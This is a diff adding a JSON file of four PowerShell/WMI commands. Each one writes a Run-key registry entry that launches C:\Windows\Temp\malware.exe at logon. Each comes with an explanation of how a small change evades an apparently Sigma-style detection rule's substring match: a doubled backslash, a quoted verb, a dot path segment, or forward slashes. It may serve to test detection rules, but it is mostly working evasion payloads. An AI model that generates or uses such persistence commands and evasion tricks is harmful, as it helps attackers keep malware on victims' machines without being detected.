@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\\\Run\" /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\malware.exe\" /f'",
+    "explanation": "Recoding / Encoding technique: Adding a duplicate backslash ('\\\\') within the registry path string breaks the literal match for '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'. The underlying Windows API and registry service normalize consecutive path separators automatically upon evaluation, retaining equivalent test behavior."
+  },
+  {
+    "output": "powershell.exe Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe \"add\" HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\Windows\\Temp\\malware.exe\" /f'",
+    "explanation": "Insertion technique: Quoting the registry action verb ('\"add\"') disrupts the continuous string sequence ' add ' required by 'selection_execution_cmd'. The Windows command-line tokenizer unquotes the literal value dynamically, allowing reg.exe to process the command without structural behavior modifications."
+  },
+  {
+    "output": "powershell.exe Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\Windows\\.\\Temp\\malware.exe\" /f'",
+    "explanation": "Recoding / Encoding technique: Injecting a current directory dot pattern ('\\.\\') within the payload file path subverts the substring identification rule for ':\\Windows\\Temp'. The operating system completely resolves this pattern back to the physical absolute destination folder path when mapping the file pointer."
+  },
+  {
+    "output": "powershell.exe Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:/Windows/Temp/malware.exe\" /f'",
+    "explanation": "Substitution technique: Substituting forward slashes ('/') for standard backslashes ('\\') inside the target execution string. The Windows file execution subsystem natively addresses forward slashes dynamically during resource lookup routines, neutralizing the ':\\Windows\\Temp' substring constraint."
+  }
+]
